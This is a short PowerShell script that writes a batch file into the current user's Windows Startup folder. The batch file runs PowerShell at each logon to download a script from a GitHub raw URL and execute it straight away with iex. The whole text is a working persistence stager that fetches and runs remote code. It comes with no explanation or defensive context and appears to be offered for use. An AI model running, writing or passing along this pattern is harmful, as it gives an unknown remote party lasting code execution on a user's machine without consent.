$CMD_FILE = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\cmd.cmd"
"@echo off" | Out-File -FilePath $CMD_FILE -Encoding ASCII
"powershell -Command `"iwr -useb 'https://raw.githubusercontent.com/Coldi4k/execute/refs/heads/main/main.ps1' | iex`"" | Add-Content -FilePath $CMD_FILE -Encoding ASCII
